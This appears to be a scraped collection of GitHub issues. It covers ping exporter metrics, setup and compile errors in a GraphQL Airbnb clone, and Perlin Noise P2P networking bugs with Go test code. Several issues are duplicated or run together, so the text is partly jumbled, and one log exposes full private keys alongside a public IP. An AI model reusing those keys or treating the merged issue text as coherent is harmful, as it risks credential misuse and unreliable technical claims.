ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 3
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 5
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 2
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 6
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 3
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 10
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 3
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 3
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 2
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 2
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 8
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 5
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 6
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 29
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 5
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 6
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 5
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 5
```
As can be seen from the curl command above, maximum latency is mostly reported as 0 ms, but varies up 29ms to localhost:
![image](https://user-images.githubusercontent.com/19568035/60249718-a5412500-98c5-11e9-9d67-813ffb0ee36b.png)
<---------->
136923813
Hey, do you create 1 loader for each type of `entity` and that's enough? no need for separate loaders for subqueries? So if you query 
```GQL
{Article
  { Comments  {ids}  
}
}
```
, if you have a CommentLoader that will load as only 2 SQL calls? I have followed the steps listed in the README and launch the server and frontend with yarn start. However, when I navigate to localhost:3000, nothing is displayed. There's no errors in the console either, however I can see the GraphQL server on localhost:4000. I can confirm that the postgres DB and redis are running. 

Any ideas on what the problem could be? I have followed the steps listed in the README and launch the server and frontend with yarn start. However, when I navigate to localhost:3000, nothing is displayed. There's no errors in the console either, however I can see the GraphQL server on localhost:4000. I can confirm that the postgres DB and redis are running. 

Any ideas on what the problem could be? Hello,

i just did what it is written in the page but cannot run the website due to an error
ailed to compile.

/home/ian/super_app/fullstack-graphql-airbnb-clone/packages/web/src/modules/listing/shared/ListingForm.tsx
(71,11): An expression of type 'void' cannot be tested for truthiness

any suggestion?

Best regards,

Ian




 Hey Ben,

Do you recommend to use `"synchronize": true` in production and `"synchronize": false` in development and run manually the migrations locally?

Is it OK? can you explain why you're doing it like that?

https://github.com/benawad/fullstack-graphql-airbnb-clone/blob/8bbca2d30a6c67e9fa27f9fc4c5973cc2b075dd1/packages/server/ormconfig.json Hey Ben,

Do you recommend to use `"synchronize": true` in production and `"synchronize": false` in development and run manually the migrations locally?

It is OK? can you explain why you're doing it like that?

https://github.com/benawad/fullstack-graphql-airbnb-clone/blob/8bbca2d30a6c67e9fa27f9fc4c5973cc2b075dd1/packages/server/ormconfig.json Failed to compile with the below error 
C:/Work/MB/clientBi/src/controllers/modules/ChangePasswordController/index.tsx
Property 'data' does not exist on type 'void | FetchResult<ForgotPasswordChangeMutation, Record<string, any>, Record<string, any>>
 Getting this error in the console after executing all steps in readme, last step (yarn start in packages/web):

client.js:426 WebSocket connection to 'ws://localhost:4000/' failed: Error in connection establishment: net::ERR_CONNECTION_REFUSED Cannot write file 'c:/Users/HP/Desktop/abb/packages/controller/dist/index.d.ts' because it would overwrite input file.ts
Cannot write file 'c:/Users/HP/Desktop/abb/packages/controller/dist/index.d.ts' because it would overwrite input file.ts TypeError: environment.teardown is not a function

      at ../../node_modules/jest-runner/build/runTest.js:440:25 Hi,
Is there any way to introduce recommendation engine Hey,

Think I've done everything correctly, after starting the server and web just not seeing anything in browser. No errors on Chrome console. 

Thanks,
Rich
<img width="1680" alt="Screen Shot 2019-08-31 at 2 15 30 PM" src="https://user-images.githubusercontent.com/32384198/64070391-1371d300-cbfa-11e9-9611-ae5843dbb879.png">
 in the console i am getting below error  
"'ws://localhost:4000/' failed: Error in connection establishment: net::ERR_CONNECTION_REFUSED" Error when make $ yarn start 
on /fullstack-graphql-airbnb-clone/packages/server

```
yarn run v1.19.1
warning package.json: No license field
$ cross-env NODE_ENV=development nodemon --exec ts-node src/index.ts
[nodemon] 1.17.5
[nodemon] to restart at any time, enter `rs`
[nodemon] watching: *.*
[nodemon] starting `ts-node src/index.ts`
query: START TRANSACTION
query: SELECT * FROM current_schema()
query: SELECT * FROM "information_schema"."tables" WHERE ("table_schema" = 'public' AND "table_name" = 'listings') OR ("table_schema" = 'public' AND "table_name" = 'users') OR ("table_schema" = 'public' AND "table_name" = 'messages')
query: SELECT *, "udt_name"::"regtype" AS "regtype" FROM "information_schema"."columns" WHERE ("table_schema" = 'public' AND "table_name" = 'listings') OR ("table_schema" = 'public' AND "table_name" = 'users') OR ("table_schema" = 'public' AND "table_name" = 'messages')
query: SELECT "ns"."nspname" AS "table_schema", "t"."relname" AS "table_name", "cnst"."conname" AS "constraint_name", "cnst"."consrc" AS "expression", CASE "cnst"."contype" WHEN 'p' THEN 'PRIMARY' WHEN 'u' THEN 'UNIQUE' WHEN 'c' THEN 'CHECK' END AS "constraint_type", "a"."attname" AS "column_name" FROM "pg_constraint" "cnst" INNER JOIN "pg_class" "t" ON "t"."oid" = "cnst"."conrelid" INNER JOIN "pg_namespace" "ns" ON "ns"."oid" = "cnst"."connamespace" INNER JOIN "pg_attribute" "a" ON "a"."attrelid" = "cnst"."conrelid" AND "a"."attnum" = ANY ("cnst"."conkey") WHERE "t"."relkind" = 'r' AND (("ns"."nspname" = 'public' AND "t"."relname" = 'listings') OR ("ns"."nspname" = 'public' AND "t"."relname" = 'users') OR ("ns"."nspname" = 'public' AND "t"."relname" = 'messages'))
query: SELECT "ns"."nspname" AS "table_schema", "t"."relname" AS "table_name", "i"."relname" AS "constraint_name", "a"."attname" AS "column_name", CASE "ix"."indisunique" WHEN 't' THEN 'TRUE' ELSE'FALSE' END AS "is_unique", pg_get_expr("ix"."indpred", "ix"."indrelid") AS "condition" FROM "pg_class" "t" INNER JOIN "pg_index" "ix" ON "ix"."indrelid" = "t"."oid" INNER JOIN "pg_attribute" "a" ON "a"."attrelid" = "t"."oid"  AND "a"."attnum" = ANY ("ix"."indkey") INNER JOIN "pg_namespace" "ns" ON "ns"."oid" = "t"."relnamespace" INNER JOIN "pg_class" "i" ON "i"."oid" = "ix"."indexrelid" LEFT JOIN "pg_constraint" "cnst" ON "cnst"."conname" = "i"."relname" WHERE "t"."relkind" = 'r' AND "cnst"."contype" IS NULL AND (("ns"."nspname" = 'public' AND "t"."relname" = 'listings') OR ("ns"."nspname" = 'public' AND "t"."relname" = 'users') OR ("ns"."nspname" = 'public' AND "t"."relname" = 'messages'))
query: SELECT "con"."conname" AS "constraint_name", "con"."nspname" AS "table_schema", "con"."relname" AS "table_name", "att2"."attname" AS "column_name", "ns"."nspname" AS "referenced_table_schema", "cl"."relname" AS "referenced_table_name", "att"."attname" AS "referenced_column_name", "con"."confdeltype" AS "on_delete", "con"."confupdtype" AS "on_update" FROM ( SELECT UNNEST ("con1"."conkey") AS "parent", UNNEST ("con1"."confkey") AS "child", "con1"."confrelid", "con1"."conrelid", "con1"."conname", "con1"."contype", "ns"."nspname", "cl"."relname", CASE "con1"."confdeltype" WHEN 'a' THEN 'NO ACTION' WHEN 'r' THEN 'RESTRICT' WHEN 'c' THEN 'CASCADE' WHEN 'n' THEN 'SET NULL' WHEN 'd' THEN 'SET DEFAULT' END as "confdeltype", CASE "con1"."confupdtype" WHEN 'a' THEN 'NO ACTION' WHEN 'r' THEN 'RESTRICT' WHEN 'c' THEN 'CASCADE' WHEN 'n' THEN 'SET NULL' WHEN 'd' THEN 'SET DEFAULT' END as "confupdtype" FROM "pg_class" "cl" INNER JOIN "pg_namespace" "ns" ON "cl"."relnamespace" = "ns"."oid" INNER JOIN "pg_constraint" "con1" ON "con1"."conrelid" = "cl"."oid" WHERE "con1"."contype" = 'f' AND (("ns"."nspname" = 'public' AND "cl"."relname" = 'listings') OR ("ns"."nspname" = 'public' AND "cl"."relname" = 'users') OR ("ns"."nspname" = 'public' AND "cl"."relname" = 'messages')) ) "con" INNER JOIN "pg_attribute" "att" ON "att"."attrelid" = "con"."confrelid" AND "att"."attnum" = "con"."child" INNER JOIN "pg_class" "cl" ON "cl"."oid" = "con"."confrelid" INNER JOIN "pg_namespace" "ns" ON "cl"."relnamespace" = "ns"."oid" INNER JOIN "pg_attribute" "att2" ON "att2"."attrelid" = "con"."conrelid" AND "att2"."attnum" = "con"."parent"
query: COMMIT
query: SELECT "Listing"."id" AS "Listing_id", "Listing"."name" AS "Listing_name", "Listing"."category" AS "Listing_category", "Listing"."pictureUrl" AS "Listing_pictureUrl", "Listing"."description" AS "Listing_description", "Listing"."price" AS "Listing_price", "Listing"."beds" AS "Listing_beds", "Listing"."guests" AS "Listing_guests", "Listing"."latitude" AS "Listing_latitude", "Listing"."longitude" AS "Listing_longitude", "Listing"."amenities" AS "Listing_amenities", "Listing"."userId" AS "Listing_userId" FROM "listings" "Listing"
Error: listen EADDRINUSE :::4000
    at Object._errnoException (util.js:1022:11)
    at _exceptionWithHostPort (util.js:1044:20)
    at Server.setupListenHandle [as _listen2] (net.js:1367:14)
    at listenInCluster (net.js:1408:12)
    at Server.listen (net.js:1492:7)
    at /home/hax0r/Desktop/fullstack-graphql-airbnb-clone/node_modules/graphql-yoga/src/index.ts:368:22
    at new Promise (<anonymous>)
    at GraphQLServer.start (/home/hax0r/Desktop/fullstack-graphql-airbnb-clone/node_modules/graphql-yoga/src/index.ts:366:12)
    at Object.<anonymous> (/home/hax0r/Desktop/fullstack-graphql-airbnb-clone/packages/server/src/startServer.ts:116:28)
    at Generator.next (<anonymous>)
    at fulfilled (/home/hax0r/Desktop/fullstack-graphql-airbnb-clone/packages/server/src/startServer.ts:4:58)
    at <anonymous>
    at process._tickDomainCallback (internal/process/next_tick.js:228:7)
[nodemon] app crashed - waiting for file changes before starting...

```
<---------->
137223491
Can misbehaving peers be tracked and banned?

If a peer is misbehaving (spam/invalid request/etc), can they be tracked and banned? i found this: 
```go
skademlia.Table(node).GetPeers()
```
bug all my peers run in docker, it return all ip is 127.0.0.1

have a api return []noise.Peer ? Hello,

Since the initial [blog plost](https://medium.com/perlin-network/noise-an-opinionated-p2p-networking-stack-for-decentralized-protocols-in-go-bfc6fecf157d) that brought a lot of attention to Noise, there's been little updates on what's happening with the project, what the priorities are for roadmap (tags `v1.0.0`, `v1.1.0`, and `v2.0.0` are equally ambiguous), and how to actually the use Noise as a networking stack in external apps.

We've attempted to use Noise in our own apps but we've run into lots of problems with implementation, particularly because there is very little documentation available. The `examples` directory seems to be a state of flux, as it no longer represents very accurately what was initially published on the blog post.

I would love to see better documentation and goals of upcoming development. Does Perlin Noise need a MasterPeerNode to find other Peers?  Cloning this repo, calling `go mod vendor` and then `go run examples/chat/main.go` works fine.

The problems begin when I try to use noise from my own projects.  I did the usual  go mod init etc with a simple test source:
```
package main

import (
	"github.com/perlin-network/noise/crypto/ed25519"
	"github.com/perlin-network/noise/log"
)

func main() {
	keys := ed25519.RandomKeyPair()
	println(keys)
	// Print out loaded public/private keys.
	log.Info().
		Str("private_key", keys.PrivateKeyHex()).
		Msg("")
	log.Info().
		Str("public_key", keys.PublicKeyHex()).
		Msg("")
}
```

Calling this with `go run main.go` results in the following error:
```
go: finding github.com/perlin-network/noise/log latest
go: finding github.com/perlin-network/noise/crypto/ed25519 latest
go: finding github.com/perlin-network/noise/crypto latest
main.go:5:2: unknown import path "github.com/perlin-network/noise/log": cannot find module providing package github.com/perlin-network/noise/log
```

If I remove the logging function and only use the crypto stuff it works. If I try the same with the chat example from the noise repo but copied to my project I get the same error and also an error for the `opcodes` package.

Since I am rather new to go modules, I am probably doing something really stupid. It's just extra confusing that the crypto package works..

My go version `go version go1.11.4 linux/amd64` Add golangci linter with same configuration as in `wavelet` and fix all linting errors I did an experiment：
1：I ran chat/main.go on the public network.
2：I also ran chat/main.go on my local intranet.

The intranet takes the initiative to connect to the public network.
and connect failure

log：
1：public network：
I0914 15:35:59.067335    5092 main.go:45] Private Key: e1c79968020ee18a725849826e7130c4bb9e4962d255b6829fd8ab64534658f85640464458ddeef9eeb93368779c7015a2a43ff374ff23b3eae23b47dbfb75e8
I0914 15:35:59.067392    5092 main.go:46] Public Key: 5640464458ddeef9eeb93368779c7015a2a43ff374ff23b3eae23b47dbfb75e8
I0914 15:35:59.067700    5092 network.go:206] Listening for peers on tcp://47.91.166.18:3001.
E0914 15:38:06.366141    5092 network.go:319] dial tcp 183.192.11.228:3000: connect: connection timed out

2：local intranet：
I0914 15:36:05.452905   21932 main.go:46] Private Key: 31d4fefef611b233374a1b99363eb55dd0919b383108911bc909f455de22af0d425efc07c0d7d68d203d0e3ea1c8702a2968dd3d16f34a3909648520ade5c91d
I0914 15:36:05.459852   21932 main.go:47] Public Key: 425efc07c0d7d68d203d0e3ea1c8702a2968dd3d16f34a3909648520ade5c91d
I0914 15:36:05.464287   21932 network.go:206] Listening for peers on tcp://127.0.0.1:3000.

I think the port of public network connect local intranet should‘t be 3000 ，is right？

forgive my poor English Sry I'm starter with Noise .
I saw the title of Usage. But I don't know how to use this.
Compile proto?
Go get noise?
Can u guide step by step?
Thank you. Currently there are same peers selected and tried to dial even in case they failed recently. Which results to huge delay (especially in case of default 3s connection timeout).

There should be better strategy which should consider latest successful/failed connection to select only live (or potentially live) peers. **Context** 

- We are bootstrapping our peers on the fly using skamdelia (see branch stateless) to a unique seed peer
- So peers are not calling Bootstrap(peers...) with all the peers inside.
- Each peer is broadcasting messages to other peers

**Protocol and Expected result**

- We have 3 peers: a seed peer (0) and 2 standard peers (1) and (2)
- We first bootstrap (1) with (0)
- (0) and (1) broadcast a message
- Then later we boostrap (2) with (0), but not with (1) because this node is not a seed and should be discovered via skamdelia protocol

We expect that each peer correctly receives the messages broadcasted by other peers who bootstrapped their network on peer (0) as follow:
- (0) receives broadcast message from (1)
- (1) receives broadcast message from (0)
- (0) receives broadcast message from (2)
- (1) receives broadcast message from (2)


**Issue**

- (1) does not receive broadcast message from (2), see output:
```
=== RUN   TestSKademliaBootstrapAsync
**** peer connected to : [203 238 10 19 93 183 123 236 12 102 218 251 251 81 209 226 155 112 242 88 190 89 238 184 193 165 174 141 104 62 222 182]
{"level":"info","self":"localhost:53612","peers":["localhost:53618"],"time":"2019-01-10T16:46:55-06:00","caller":"/Users/rpellerin/GO/src/github.com/perlin-network/noise/skademlia/discovery/service.go:143","message":"Connected to peer(s)."}
{"level":"info","self":"localhost:53618","peers":["localhost:53612"],"time":"2019-01-10T16:46:55-06:00","caller":"/Users/rpellerin/GO/src/github.com/perlin-network/noise/skademlia/discovery/service.go:119","message":"Bootstrapped w/ peer(s)."}
**** peer connected to : [203 238 10 19 93 183 123 236 12 102 218 251 251 81 209 226 155 112 242 88 190 89 238 184 193 165 174 141 104 62 222 182]
{"level":"info","self":"localhost:53612","peers":["localhost:53624","localhost:53618"],"time":"2019-01-10T16:46:58-06:00","caller":"/Users/rpellerin/GO/src/github.com/perlin-network/noise/skademlia/discovery/service.go:143","message":"Connected to peer(s)."}
**** peer connected to : [180 253 10 202 145 106 93 186 232 233 58 232 147 243 212 108 27 53 67 162 212 95 40 189 164 188 96 186 179 11 156 248]
{"level":"info","self":"localhost:53618","peers":["localhost:53612","localhost:53624"],"time":"2019-01-10T16:46:58-06:00","caller":"/Users/rpellerin/GO/src/github.com/perlin-network/noise/skademlia/discovery/service.go:143","message":"Connected to peer(s)."}
{"level":"info","self":"localhost:53624","peers":["localhost:53612","localhost:53618"],"time":"2019-01-10T16:46:58-06:00","caller":"/Users/rpellerin/GO/src/github.com/perlin-network/noise/skademlia/discovery/service.go:119","message":"Bootstrapped w/ peer(s)."}
message received by node 1: This is a broadcasted message from Node 0.
message received by node 0: This is a broadcasted message from Node 1.
message received by node 0: This is a broadcasted message from Node 2.
--- PASS: TestSKademliaBootstrapAsync (51.97s)
```

**Reproducer**

Branch: *stateless*
Head: 7d7af51af2a16c6a6d1b3e3da6d15c3e5392b099
Method to add to */examples/skamdelia/skamdelia_test.go*:

```golang
func TestSKademliaBootstrapAsync(t *testing.T) {
	numNodes := 3
	nodes := makeNodes(numNodes)

	// Connect other nodes to node 0
	assert.Nil(t, nodes[1].Bootstrap(nodes[0].Self()))

	// make sure nodes are connected
	time.Sleep(time.Duration(len(nodes)) * time.Second)

	// assert broadcasts goes to everyone
	for i := 0; i < len(nodes)-1; i++ {
		expected := fmt.Sprintf("This is a broadcasted message from Node %d.", i)
		assert.Nil(t, nodes[i].Broadcast(context.Background(), &noise.MessageBody{
			Service: bootstrapOpcode,
			Payload: ([]byte)(expected),
		}))
	}

	assert.Nil(t, nodes[2].Bootstrap(nodes[0].Self()))

	expected := fmt.Sprintf("This is a broadcasted message from Node %d.", 2)
	assert.Nil(t, nodes[2].Broadcast(context.Background(), &noise.MessageBody{
		Service: bootstrapOpcode,
		Payload: ([]byte)(expected),
	}))

	// make sure nodes are connected
	time.Sleep(time.Duration(len(nodes)) * time.Second)

	for i := 0; i < len(nodes); i++ {
		// Check if message was received by other nodes.
		for j := 0; j < len(nodes); j++ {
			if i == j {
				continue
			}
			select {
			case received := <-nodes[j].Mailbox:
				fmt.Println("message received by node "+strconv.Itoa(j)+":", string(received))
			case <-time.After(2 * time.Second):
				//assert.Fail(t, "Timed out attempting to receive message", "from Node %d for Node %d", i, j)
			}
		}
	}
}
```

 **Context** 

- We are bootstrapping our peers on the fly using skamdelia (see branch stateless) to a unique seed peer
- So peers are not calling Bootstrap(peers...) with all the peers inside.
- Each peer is broadcasting messages to other peers

**Protocol and Expected result**

- We have 3 peers: a seed peer (0) and 2 standard peers (1) and (2)
- We first bootstrap (1) with (0)
- (0) and (1) broadcast a message
- Then later we boostrap (2) with (0), but not with (1) because this node is not a seed and should be discovered via skamdelia protocol

We expect that each peer correctly receives the messages broadcasted by other peers who bootstrapped their network on peer (0) as follow:
- (0) receives broadcast message from (1)
- (1) receives broadcast message from (0)
- (0) receives broadcast message from (2)
- (1) receives broadcast message from (2)


**Issue**

- (1) does not receive broadcast message from (2), see output:
```
=== RUN   TestSKademliaBootstrapAsync
**** peer connected to : [203 238 10 19 93 183 123 236 12 102 218 251 251 81 209 226 155 112 242 88 190 89 238 184 193 165 174 141 104 62 222 182]
{"level":"info","self":"localhost:53612","peers":["localhost:53618"],"time":"2019-01-10T16:46:55-06:00","caller":"/Users/rpellerin/GO/src/github.com/perlin-network/noise/skademlia/discovery/service.go:143","message":"Connected to peer(s)."}
{"level":"info","self":"localhost:53618","peers":["localhost:53612"],"time":"2019-01-10T16:46:55-06:00","caller":"/Users/rpellerin/GO/src/github.com/perlin-network/noise/skademlia/discovery/service.go:119","message":"Bootstrapped w/ peer(s)."}
**** peer connected to : [203 238 10 19 93 183 123 236 12 102 218 251 251 81 209 226 155 112 242 88 190 89 238 184 193 165 174 141 104 62 222 182]
{"level":"info","self":"localhost:53612","peers":["localhost:53624","localhost:53618"],"time":"2019-01-10T16:46:58-06:00","caller":"/Users/rpellerin/GO/src/github.com/perlin-network/noise/skademlia/discovery/service.go:143","message":"Connected to peer(s)."}
**** peer connected to : [180 253 10 202 145 106 93 186 232 233 58 232 147 243 212 108 27 53 67 162 212 95 40 189 164 188 96 186 179 11 156 248]
{"level":"info","self":"localhost:53618","peers":["localhost:53612","localhost:53624"],"time":"2019-01-10T16:46:58-06:00","caller":"/Users/rpellerin/GO/src/github.com/perlin-network/noise/skademlia/discovery/service.go:143","message":"Connected to peer(s)."}
{"level":"info","self":"localhost:53624","peers":["localhost:53612","localhost:53618"],"time":"2019-01-10T16:46:58-06:00","caller":"/Users/rpellerin/GO/src/github.com/perlin-network/noise/skademlia/discovery/service.go:119","message":"Bootstrapped w/ peer(s)."}
message received by node 1: This is a broadcasted message from Node 0.
message received by node 0: This is a broadcasted message from Node 1.
message received by node 0: This is a broadcasted message from Node 2.
--- PASS: TestSKademliaBootstrapAsync (51.97s)
```

**Reproducer**

Branch: *stateless*
Head: 7d7af51af2a16c6a6d1b3e3da6d15c3e5392b099
Method to add to */examples/skamdelia/skamdelia_test.go*:

```golang
func TestSKademliaBootstrapAsync(t *testing.T) {
	numNodes := 3
	nodes := makeNodes(numNodes)

	// Connect other nodes to node 0
	assert.Nil(t, nodes[1].Bootstrap(nodes[0].Self()))

	// make sure nodes are connected
	time.Sleep(time.Duration(len(nodes)) * time.Second)

	// assert broadcasts goes to everyone
	for i := 0; i < len(nodes)-1; i++ {
		expected := fmt.Sprintf("This is a broadcasted message from Node %d.", i)
		assert.Nil(t, nodes[i].Broadcast(context.Background(), &noise.MessageBody{
			Service: bootstrapOpcode,
			Payload: ([]byte)(expected),
		}))
	}

	assert.Nil(t, nodes[2].Bootstrap(nodes[0].Self()))

	expected := fmt.Sprintf("This is a broadcasted message from Node %d.", 2)
	assert.Nil(t, nodes[2].Broadcast(context.Background(), &noise.MessageBody{
		Service: bootstrapOpcode,
		Payload: ([]byte)(expected),
	}))

	// make sure nodes are connected
	time.Sleep(time.Duration(len(nodes)) * time.Second)

	for i := 0; i < len(nodes); i++ {
		// Check if message was received by other nodes.
		for j := 0; j < len(nodes); j++ {
			if i == j {
				continue
			}
			select {
			case received := <-nodes[j].Mailbox:
				fmt.Println("message received by node "+strconv.Itoa(j)+":", string(received))
			case <-time.After(2 * time.Second):
